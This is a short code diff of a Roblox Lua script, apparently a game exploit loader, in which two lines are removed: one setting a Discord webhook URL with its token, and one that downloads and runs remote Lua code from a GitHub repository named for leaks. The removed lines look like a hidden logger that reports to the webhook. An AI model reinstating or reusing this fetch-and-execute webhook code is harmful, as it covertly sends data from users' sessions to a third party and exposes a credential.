@@ -540,9 +540,7 @@ if getserver.StatusCode == 200 and gethwid.StatusCode == 200 then
                         Icon = "http://www.roblox.com/asset/?id=", -- LOGO
                         Duration = 2.5
                     })
-                    
-                    getgenv().WebhookHere = "https://discord.com/api/webhooks/947370023251505163/UUHnaBZHcsPcKgmQZjl64M59p6t1MhOcg0Rnnz9CjoSDihBhuRic2y-E1TVOo7IebqwN"
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+                
                     
                     local blur = Instance.new("BlurEffect", game.Lighting)
                     blur.Size = 0
